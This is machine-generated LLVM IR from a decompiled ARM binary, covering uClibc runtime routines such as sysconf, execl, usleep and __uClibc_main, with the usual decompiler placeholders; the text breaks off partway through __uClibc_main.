define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -33928), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_14428 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -33928))
  store i32 %v1_14428, i32* @r6, align 4
  %v2_1442c = icmp eq i32 %v1_14428, 0
  br i1 %v2_1442c, label %dec_label_pc_144ac, label %dec_label_pc_14434

dec_label_pc_14434:                               ; preds = %entry
  store i32 3528, i32* @sl, align 4
  %v0_1443c = load i32, i32* @r4, align 4
  %v2_1443c = add i32 %v0_1443c, -33916
  store i32 %v2_1443c, i32* @r8, align 4
  %v2_14440 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_14440, i32* @r7, align 4
  br label %bb18

dec_label_pc_14448:                               ; preds = %bb18
  %v3_14448 = load i32, i32* %stack_var_-36, align 4
  %v1_1444c = inttoptr i32 %v3_14448 to i32*
  %v2_1444c = load i32, i32* %v1_1444c, align 4
  %v1_14450 = inttoptr i32 %v2_1444c to i8*
  %v2_14450 = load i8, i8* %v1_14450, align 1
  %v7_14454 = icmp eq i8 %v2_14450, 99
  br i1 %v7_14454, label %dec_label_pc_1445c, label %.backedge3

dec_label_pc_1445c:                               ; preds = %dec_label_pc_14448
  %v1_1445c = add i32 %v2_1444c, 1
  %v2_1445c = inttoptr i32 %v1_1445c to i8*
  %v3_1445c = load i8, i8* %v2_1445c, align 1
  %v7_14460 = icmp eq i8 %v3_1445c, 112
  br i1 %v7_14460, label %dec_label_pc_14468, label %.backedge3

dec_label_pc_14468:                               ; preds = %dec_label_pc_1445c
  %v1_14468 = add i32 %v2_1444c, 2
  %v2_14468 = inttoptr i32 %v1_14468 to i8*
  %v3_14468 = load i8, i8* %v2_14468, align 1
  %v7_1446c = icmp eq i8 %v3_14468, 117
  br i1 %v7_1446c, label %dec_label_pc_14474, label %.backedge3

dec_label_pc_14474:                               ; preds = %dec_label_pc_14468
  %v1_14474 = add i32 %v2_1444c, 3
  %v2_14474 = inttoptr i32 %v1_14474 to i8*
  %v3_14474 = load i8, i8* %v2_14474, align 1
  %v4_14474 = zext i8 %v3_14474 to i32
  %v0_14478 = load i32, i32* @r4, align 4
  %v1_14478 = load i32, i32* @sl, align 4
  %v2_14478 = add i32 %v1_14478, %v0_14478
  %v3_14478 = inttoptr i32 %v2_14478 to i32*
  %v4_14478 = load i32, i32* %v3_14478, align 4
  %v2_1447c = mul nuw nsw i32 %v4_14474, 2
  %v2_14480 = add i32 %v4_14478, %v2_1447c
  %v3_14480 = inttoptr i32 %v2_14480 to i16*
  %v4_14480 = load i16, i16* %v3_14480, align 2
  %v1_14484 = and i16 %v4_14480, 8
  %v2_14484 = icmp eq i16 %v1_14484, 0
  br i1 %v2_14484, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_14474
  %v1_14488 = load i32, i32* @r5, align 4
  %v2_14488 = add i32 %v1_14488, 1
  store i32 %v2_14488, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_14474, %dec_label_pc_14448, %dec_label_pc_1445c, %dec_label_pc_14468
  %v0_1448c.pre = load i32, i32* @r6, align 4
  %v0_14498.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_14434
  %v0_14498 = phi i32 [ %v0_14498.pre, %.backedge3 ], [ %v2_1443c, %dec_label_pc_14434 ]
  %v0_1448c = phi i32 [ %v0_1448c.pre, %.backedge3 ], [ %v1_14428, %dec_label_pc_14434 ]
  %v4_1449c = inttoptr i32 %v0_1448c to i32*
  %v5_1449c = call i32 @__GI_config_read(i32* %v4_1449c, i32 %v2_14440, i32 258, i32 %v0_14498)
  %v2_144a0 = icmp eq i32 %v5_1449c, 0
  br i1 %v2_144a0, label %dec_label_pc_14510, label %dec_label_pc_14448

dec_label_pc_144ac:                               ; preds = %entry
  %v0_144b0 = load i32, i32* @r4, align 4
  %v2_144b0 = add i32 %v0_144b0, -33912
  store i32 %v2_144b0, i32* @r0, align 4
  %v1_144b4 = call i32 @__GI_config_open(i32 %v2_144b0)
  store i32 %v1_144b4, i32* @r6, align 4
  %v2_144b8 = icmp eq i32 %v1_144b4, 0
  br i1 %v2_144b8, label %bb19, label %dec_label_pc_144c4

bb19:                                             ; preds = %dec_label_pc_144ac
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_14510

dec_label_pc_144c4:                               ; preds = %dec_label_pc_144ac
  %v0_144c8 = load i32, i32* @r4, align 4
  %v2_144c8 = add i32 %v0_144c8, -33896
  store i32 %v2_144c8, i32* @r8, align 4
  %v2_144d0 = add i32 %v0_144c8, -33860
  store i32 %v2_144d0, i32* @r7, align 4
  %v2_144d4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_144d4, i32* @r4, align 4
  br label %bb21

dec_label_pc_144dc:                               ; preds = %bb21
  %v0_14508 = load i32, i32* @r8, align 4
  %v3_144dc = load i32, i32* %stack_var_-36, align 4
  %v1_144e0 = inttoptr i32 %v3_144dc to i32*
  %v2_144e0 = load i32, i32* %v1_144e0, align 4
  store i32 %v2_144e0, i32* @r1, align 4
  %v2_144e4 = inttoptr i32 %v0_14508 to i8*
  %v3_144e4 = call i32 @__GI_strcoll(i8* %v2_144e4, i32 %v2_144e0)
  %v2_144e8 = icmp eq i32 %v3_144e4, 0
  br i1 %v2_144e8, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_144dc
  %v1_144ec = load i32, i32* @r5, align 4
  %v2_144ec = add i32 %v1_144ec, 1
  store i32 %v2_144ec, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_144dc
  %v0_144f8.pre = load i32, i32* @r7, align 4
  %v0_144fc.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_144c4
  %v0_144fc = phi i32 [ %v0_144fc.pre, %.backedge ], [ %v1_144b4, %dec_label_pc_144c4 ]
  %v0_144f8 = phi i32 [ %v0_144f8.pre, %.backedge ], [ %v2_144d0, %dec_label_pc_144c4 ]
  %v4_14500 = inttoptr i32 %v0_144fc to i32*
  %v5_14500 = call i32 @__GI_config_read(i32* %v4_14500, i32 %v2_144d4, i32 459266, i32 %v0_144f8)
  %v2_14504 = icmp eq i32 %v5_14500, 0
  br i1 %v2_14504, label %dec_label_pc_14510, label %dec_label_pc_144dc

dec_label_pc_14510:                               ; preds = %bb18, %bb21, %bb19
  %v0_14510 = load i32, i32* @r6, align 4
  %v1_14514 = inttoptr i32 %v0_14510 to i32*
  %v2_14514 = call i32 @__GI_config_close(i32* %v1_14514)
  %v0_14518 = load i32, i32* @r5, align 4
  %v2_14518 = icmp eq i32 %v0_14518, 0
  %.v0_14518 = select i1 %v2_14518, i32 1, i32 %v0_14518
  ret i32 %.v0_14518

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder label %dec_label_pc_14510, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_1493c

bb:                                               ; preds = %entry
  %v7_14568 = mul i32 %arg1, 4
  %v8_14568 = add i32 %v7_14568, ptrtoint (i32* @global_var_14570.811 to i32)
  call void @__pseudo_branch(i32 %v8_14568)
  br label %dec_label_pc_1493c

dec_label_pc_1493c:                               ; preds = %bb, %entry
  %v0_1493c = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_14948 = inttoptr i32 %v0_1493c to i32*
  store i32 22, i32* %v2_14948, align 4
  %v0_14af8 = load i32, i32* %r2.global-to-local, align 4
  ret i32 %v0_14af8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_14b2c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_14b2c, i32* %ip.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v2_14b40 = ptrtoint i32* %stack_var_-40 to i32
  %v2_14b44 = ptrtoint i32* %stack_var_-8 to i32
  br label %dec_label_pc_14b54

dec_label_pc_14b54:                               ; preds = %dec_label_pc_14b54, %entry
  %v0_14b68 = phi i32 [ 0, %entry ], [ %v1_14b68, %dec_label_pc_14b54 ]
  %stack_var_-36.0 = phi i32 [ %v2_14b44, %entry ], [ %v1_14b5c, %dec_label_pc_14b54 ]
  %v1_14b58 = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_14b58 = load i32, i32* %v1_14b58, align 4
  %v1_14b5c = add i32 %stack_var_-36.0, 4
  %v2_14b60 = icmp eq i32 %v2_14b58, 0
  %v1_14b68 = add i32 %v0_14b68, 1
  store i32 %v1_14b68, i32* @lr, align 4
  br i1 %v2_14b60, label %dec_label_pc_14b70, label %dec_label_pc_14b54

dec_label_pc_14b70:                               ; preds = %dec_label_pc_14b54
  %v3_14b70 = mul i32 %v1_14b68, 4
  %v1_14b74 = add i32 %v3_14b70, 18
  %v1_14b78 = and i32 %v1_14b74, -8
  %v2_14b7c = sub i32 %v2_14b40, %v1_14b78
  %v2_14b84 = inttoptr i32 %v2_14b7c to i32*
  store i32 %arg2, i32* %v2_14b84, align 4
  %v0_14b90 = load i32, i32* @sp, align 4
  store i32 %v0_14b90, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14b98

dec_label_pc_14b98:                               ; preds = %dec_label_pc_14b98, %dec_label_pc_14b70
  %v1_14bac = phi i32 [ %v0_14b90, %dec_label_pc_14b70 ], [ %v5_14bac, %dec_label_pc_14b98 ]
  %stack_var_-36.1 = phi i32 [ %v2_14b44, %dec_label_pc_14b70 ], [ %v1_14ba4, %dec_label_pc_14b98 ]
  %v1_14b9c = inttoptr i32 %stack_var_-36.1 to i32*
  %v2_14b9c = load i32, i32* %v1_14b9c, align 4
  %v0_14ba0 = load i32, i32* @lr, align 4
  %v1_14ba0 = add i32 %v0_14ba0, -1
  store i32 %v1_14ba0, i32* @lr, align 4
  %v7_14ba0 = icmp eq i32 %v0_14ba0, 1
  %v1_14ba4 = add i32 %stack_var_-36.1, 4
  %v2_14bac = add i32 %v1_14bac, 4
  %v3_14bac = inttoptr i32 %v2_14bac to i32*
  store i32 %v2_14b9c, i32* %v3_14bac, align 4
  %v4_14bac = load i32, i32* %ip.global-to-local, align 4
  %v5_14bac = add i32 %v4_14bac, 4
  store i32 %v5_14bac, i32* %ip.global-to-local, align 4
  br i1 %v7_14ba0, label %dec_label_pc_14bb4, label %dec_label_pc_14b98

dec_label_pc_14bb4:                               ; preds = %dec_label_pc_14b98
  %v0_14bc0 = call i32 @__GI_execve()
  ret i32 %v0_14bc0

; uselistorder directives
  uselistorder i32 %v5_14bac, { 1, 0 }
  uselistorder i32 %v0_14ba0, { 1, 0 }
  uselistorder i32 %v1_14b68, { 0, 2, 1 }
  uselistorder i32 %stack_var_-36.0, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @usleep(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_14be0 = ptrtoint i32* %stack_var_-24 to i32
  %v2_14bec = udiv i32 %arg1, 1000000
  store i32 %v2_14bec, i32* %stack_var_-24, align 4
  %v2_14c14 = call i32 @__libc_nanosleep(i32 %v2_14be0, i32 0)
  ret i32 %v2_14c14
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_14c38 = add i32 %tmp, 4
  %v4_14c38 = inttoptr i32 %v3_14c38 to i32*
  store i32 %arg3, i32* %v4_14c38, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_14c44 = icmp eq i32 %arg2, 0
  br i1 %v2_14c44, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v3_14c5c = call i32 @unknown_0()
  ret i32 %v3_14c5c

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_14c90.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14c6c = load i32, i32* @r4, align 4
  store i32 %v3_14c6c, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -8), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14c90

dec_label_pc_14c90:                               ; preds = %dec_label_pc_14c90.dec_label_pc_14c90_crit_edge, %dec_label_pc_14c90.lr.ph
  %v1_14c90 = phi i32 [ %v1_14c9c, %dec_label_pc_14c90.dec_label_pc_14c90_crit_edge ], [ 0, %dec_label_pc_14c90.lr.ph ]
  %v0_14c90 = phi i32 [ %v0_14c90.pre, %dec_label_pc_14c90.dec_label_pc_14c90_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -8), %dec_label_pc_14c90.lr.ph ]
  %v4_14c90 = mul i32 %v1_14c90, 4
  %v5_14c90 = add i32 %v4_14c90, %v0_14c90
  %v6_14c90 = inttoptr i32 %v5_14c90 to i32*
  %v7_14c90 = load i32, i32* %v6_14c90, align 4
  call void @__pseudo_branch(i32 %v7_14c90)
  %v0_14c9c = load i32, i32* %r4.global-to-local, align 4
  %v1_14c9c = add i32 %v0_14c9c, -1
  store i32 %v1_14c9c, i32* %r4.global-to-local, align 4
  %v2_14c9c = icmp eq i32 %v0_14c9c, 0
  br i1 %v2_14c9c, label %dec_label_pc_14ca4, label %dec_label_pc_14c90.dec_label_pc_14c90_crit_edge

dec_label_pc_14c90.dec_label_pc_14c90_crit_edge:  ; preds = %dec_label_pc_14c90
  %v0_14c90.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14c90

dec_label_pc_14ca4:                               ; preds = %dec_label_pc_14c90
  %v0_14ca8.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_14ca8 = add i32 %v0_14ca8.pre, 29300
  %v3_14ca8 = inttoptr i32 %v2_14ca8 to i32*
  %v4_14ca8 = load i32, i32* %v3_14ca8, align 4
  %v2_14cac = icmp eq i32 %v4_14ca8, 0
  br i1 %v2_14cac, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_14ca4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_14ca4, %bb
  %v2_14cb4 = xor i1 %v2_14cac, true
  call void @__pseudo_cond_branch(i1 %v2_14cb4, i32 %v4_14ca8)
  %v0_14cbc = load i32, i32* %r5.global-to-local, align 4
  %v2_14cbc = add i32 %v0_14cbc, 29304
  %v3_14cbc = inttoptr i32 %v2_14cbc to i32*
  %v4_14cbc = load i32, i32* %v3_14cbc, align 4
  %v2_14cc0 = icmp eq i32 %v4_14cbc, 0
  br i1 %v2_14cc0, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_14cc8 = xor i1 %v2_14cc0, true
  call void @__pseudo_cond_branch(i1 %v2_14cc8, i32 %v4_14cbc)
  %v2_14ccc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14ccc, i32* %r4.global-to-local, align 4
  %v1_14cd0 = load i32, i32* @r0, align 4
  ret i32 %v1_14cd0

; uselistorder directives
  uselistorder i32 %v1_14c9c, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_14cfc = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_14d04 = icmp eq i32 %v2_14cfc, -1
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @r3, align 4
  br i1 %v3_14d04, label %dec_label_pc_14d10, label %dec_label_pc_14d28

dec_label_pc_14d10:                               ; preds = %entry
  %v0_14d14 = load i32, i32* %r5.global-to-local, align 4
  %v2_14d1c = call i32 @__GI_open(i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -33856), i32 %v0_14d14)
  %v1_14d20 = load i32, i32* %r4.global-to-local, align 4
  %v1_14d24 = icmp ne i32 %v2_14d1c, %v1_14d20
  call void @__pseudo_cond_branch(i1 %v1_14d24, i32 ptrtoint (i32* @global_var_13978.830 to i32))
  br label %dec_label_pc_14d28

dec_label_pc_14d28:                               ; preds = %entry, %dec_label_pc_14d10
  %v1_14d30 = phi i32 [ %v2_14cfc, %entry ], [ %v2_14d1c, %dec_label_pc_14d10 ]
  ret i32 %v1_14d30

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_14d28, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r4.global-to-local, align 4
  %v4_14d4c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 96) to i32*), align 4
  %v1_14d50 = inttoptr i32 %v4_14d4c to i32*
  %v2_14d50 = load i32, i32* %v1_14d50, align 4
  %v2_14d54 = icmp eq i32 %v2_14d50, 0
  br i1 %v2_14d54, label %dec_label_pc_14d5c, label %dec_label_pc_14d90

dec_label_pc_14d5c:                               ; preds = %entry
  %v4_14d60 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 56) to i32*), align 4
  %v2_14d68 = icmp eq i32 %v4_14d60, 0
  store i32 4096, i32* %v1_14d50, align 4
  br i1 %v2_14d68, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_14d5c
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_14d5c, %bb
  %v2_14d74 = xor i1 %v2_14d68, true
  call void @__pseudo_cond_branch(i1 %v2_14d74, i32 %v4_14d60)
  %v0_14d7c = load i32, i32* %r4.global-to-local, align 4
  %v2_14d7c = add i32 %v0_14d7c, -92004
  %v2_14d84 = icmp eq i32 %v2_14d7c, 0
  br i1 %v2_14d84, label %bb6, label %bb5

bb5:                                              ; preds = %bb4
  br label %bb6

bb6:                                              ; preds = %bb4, %bb5
  %v2_14d8c = xor i1 %v2_14d84, true
  call void @__pseudo_cond_branch(i1 %v2_14d8c, i32 %v2_14d7c)
  br label %dec_label_pc_14d90

dec_label_pc_14d90:                               ; preds = %entry, %bb6
  %v1_14d94 = load i32, i32* @r0, align 4
  ret i32 %v1_14d94

; uselistorder directives
  uselistorder label %dec_label_pc_14d90, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %tmp50 = call i32 @__decompiler_undefined_function_0()
  %tmp51 = call i32 @__decompiler_undefined_function_0()
  %tmp52 = call i32 @__decompiler_undefined_function_0()
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %tmp54 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r7, align 4
  %v1_14db0 = add i32 %tmp, 4
  store i32 %v1_14db0, i32* %ip.global-to-local, align 4
  %v2_14db4 = load i32, i32* %arg3, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @r6, align 4
  %v3_14dc0 = mul i32 %arg2, 4
  store i32 %v3_14dc0, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v4_14dc8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 20) to i32*), align 4
  store i32 28, i32* %r2.global-to-local, align 4
  %v2_14dd0 = ptrtoint i32* %stack_var_-120 to i32
  %v4_14dd4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 28) to i32*), align 4
  store i32 %v4_14dd4, i32* %r4.global-to-local, align 4
  %v2_14ddc = add i32 %v1_14db0, %v3_14dc0
  store i32 %v2_14ddc, i32* %ip.global-to-local, align 4
  %v9_14de0 = icmp eq i32 %v2_14ddc, %v2_14db4
  store i1 %v9_14de0, i1* %cpsr_z.global-to-local, align 1
  %v2_14de4 = inttoptr i32 %v4_14dc8 to i32*
  store i32 %arg7, i32* %v2_14de4, align 4
  store i32 29304, i32* %r2.global-to-local, align 4
  %v0_14df0 = load i32, i32* %r3.global-to-local, align 4
  br i1 %v9_14de0, label %bb, label %.critedge

bb:                                               ; preds = %entry
  %v1_14df4 = load i32, i32* @r7, align 4
  %v2_14df4 = load i32, i32* %r5.global-to-local, align 4
  %v3_14df4 = add i32 %v2_14df4, %v1_14df4
  store i32 %v3_14df4, i32* %r3.global-to-local, align 4
  %v1_14df8 = load i32, i32* @r6, align 4
  %v3_14df8 = add i32 %v1_14df8, 29304
  %v4_14df8 = inttoptr i32 %v3_14df8 to i32*
  store i32 %arg6, i32* %v4_14df8, align 4
  %v0_14dfc = load i32, i32* %ip.global-to-local, align 4
  %v1_14dfc = load i32, i32* %r4.global-to-local, align 4
  %v2_14dfc = inttoptr i32 %v1_14dfc to i32*
  store i32 %v0_14dfc, i32* %v2_14dfc, align 4
  store i32 120, i32* @r2, align 4
  %v1_14e08 = load i32, i32* %r3.global-to-local, align 4
  %v2_14e08 = load i32, i32* %r4.global-to-local, align 4
  %v3_14e08 = inttoptr i32 %v2_14e08 to i32*
  store i32 %v1_14e08, i32* %v3_14e08, align 4
  br label %bb58

.critedge:                                        ; preds = %entry
  %v1_14df8.c = load i32, i32* @r6, align 4
  %v3_14df8.c = add i32 %v1_14df8.c, 29304
  %v4_14df8.c = inttoptr i32 %v3_14df8.c to i32*
  store i32 %arg6, i32* %v4_14df8.c, align 4
  %v0_14dfc.c = load i32, i32* %ip.global-to-local, align 4
  %v1_14dfc.c = load i32, i32* %r4.global-to-local, align 4
  %v2_14dfc.c = inttoptr i32 %v1_14dfc.c to i32*
  store i32 %v0_14dfc.c, i32* %v2_14dfc.c, align 4
  store i32 120, i32* @r2, align 4
  br label %bb58

bb58:                                             ; preds = %.critedge, %bb
  %v2_14e14 = bitcast i32* %stack_var_-120 to i8*
  %v3_14e14 = call i32 @__GI_memset(i8* %v2_14e14, i32 0)
  %v0_14e18 = load i32, i32* %r4.global-to-local, align 4
  %v1_14e18 = inttoptr i32 %v0_14e18 to i32*
  %storemerge.pre = load i32, i32* %v1_14e18, align 4
  br label %dec_label_pc_14e24

dec_label_pc_14e24:                               ; preds = %dec_label_pc_14e24, %bb58
  %storemerge = phi i32 [ %storemerge.pre, %bb58 ], [ %v4_14e24, %dec_label_pc_14e24 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_14e24 = inttoptr i32 %storemerge to i32*
  %v2_14e24 = load i32, i32* %v1_14e24, align 4
  store i32 %v2_14e24, i32* %r3.global-to-local, align 4
  %v4_14e24 = add i32 %storemerge, 4
  store i32 %v4_14e24, i32* %r2.global-to-local, align 4
  %v2_14e28 = icmp eq i32 %v2_14e24, 0
  br i1 %v2_14e28, label %dec_label_pc_14e34, label %dec_label_pc_14e24

dec_label_pc_14e34:                               ; preds = %dec_label_pc_14e24
  store i32 %v4_14e24, i32* @r4, align 4
  store i32 %v2_14dd0, i32* @r5, align 4
  %v1_14e5829 = inttoptr i32 %v4_14e24 to i32*
  %v2_14e5830 = load i32, i32* %v1_14e5829, align 4
  store i32 %v2_14e5830, i32* %r3.global-to-local, align 4
  %v2_14e5c32 = icmp eq i32 %v2_14e5830, 0
  store i1 %v2_14e5c32, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14e5c32, label %dec_label_pc_14e64, label %dec_label_pc_14e40

dec_label_pc_14e40:                               ; preds = %dec_label_pc_14e34, %dec_label_pc_14e58
  %v5_14e44 = phi i32 [ %v2_14e58, %dec_label_pc_14e58 ], [ %v2_14e5830, %dec_label_pc_14e34 ]
  %v2_14e40 = icmp ugt i32 %v5_14e44, 13
  %v7_14e40 = icmp eq i32 %v5_14e44, 14
  store i1 %v7_14e40, i1* %cpsr_z.global-to-local, align 1
  %v2_14e44 = xor i1 %v2_14e40, true
  %v3_14e44 = or i1 %v7_14e40, %v2_14e44
  br i1 %v3_14e44, label %bb59, label %bb60

bb59:                                             ; preds = %dec_label_pc_14e40
  %v6_14e44 = and i32 %v5_14e44, 536870912
  %v7_14e44 = icmp ne i32 %v6_14e44, 0
  br label %bb60

bb60:                                             ; preds = %dec_label_pc_14e40, %bb59
  %v1_14e50 = phi i1 [ %v2_14e40, %dec_label_pc_14e40 ], [ %v7_14e44, %bb59 ]
  %v2_14e48 = xor i1 %v1_14e50, true
  %v3_14e48 = or i1 %v7_14e40, %v2_14e48
  br i1 %v3_14e48, label %bb61, label %dec_label_pc_14e58

bb61:                                             ; preds = %bb60
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14e58

dec_label_pc_14e58:                               ; preds = %bb60, %bb61
  call void @__pseudo_cond_branch(i1 %v3_14e48, i32 ptrtoint (i32* @global_var_11b90.839 to i32))
  %v0_14e54 = load i32, i32* @r4, align 4
  %v1_14e54 = add i32 %v0_14e54, 8
  store i32 %v1_14e54, i32* @r4, align 4
  %v1_14e58 = inttoptr i32 %v1_14e54 to i32*
  %v2_14e58 = load i32, i32* %v1_14e58, align 4
  store i32 %v2_14e58, i32* %r3.global-to-local, align 4
  %v2_14e5c = icmp eq i32 %v2_14e58, 0
  store i1 %v2_14e5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14e5c, label %dec_label_pc_14e64, label %dec_label_pc_14e40

dec_label_pc_14e64:                               ; preds = %dec_label_pc_14e58, %dec_label_pc_14e34
  %v1_14e68 = call i32 @_dl_aux_init(i32 %v2_14dd0)
  store i32 %v1_14e68, i32* @r0, align 4
  %v1_14e6c = call i32 @__GI___uClibc_init(i32 %v1_14e68)
  store i32 %v1_14e6c, i32* @r0, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  store i32 %tmp54, i32* @r2, align 4
  %v0_14e78 = load i32, i32* @r6, align 4
  %v2_14e78 = add i32 %v0_14e78, 96
  %v3_14e78 = inttoptr i32 %v2_14e78 to i32*
  %v4_14e78 = load i32, i32* %v3_14e78, align 4
  store i32 %tmp53, i32* @r3, align 4
  %v2_14e80 = icmp eq i32 %tmp54, 0
  store i1 %v2_14e80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14e80, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_14e64
  store i32 4096, i32* @r2, align 4
  br label %bb63

bb63:                                             ; preds = %dec_label_pc_14e64, %bb62
  %v0_14e8c = phi i32 [ %tmp54, %dec_label_pc_14e64 ], [ 4096, %bb62 ]
  %v3_14e88 = icmp eq i32 %tmp53, -1
  %v8_14e88 = icmp eq i32 %tmp53, -1
  store i1 %v8_14e88, i1* %cpsr_z.global-to-local, align 1
  %v2_14e8c = inttoptr i32 %v4_14e78 to i32*
  store i32 %v0_14e8c, i32* %v2_14e8c, align 4
  br i1 %v3_14e88, label %dec_label_pc_14e94, label %dec_label_pc_14ebc

dec_label_pc_14e94:                               ; preds = %bb63
  %v0_14e94 = call i32 @getuid()
  store i32 %v0_14e94, i32* @r0, align 4
  store i32 %v0_14e94, i32* @r4, align 4
  %v0_14e9c = call i32 @geteuid()
  store i32 %v0_14e9c, i32* @r0, align 4
  %v0_14ea0 = load i32, i32* @r4, align 4
  %v9_14ea0 = icmp eq i32 %v0_14ea0, %v0_14e9c
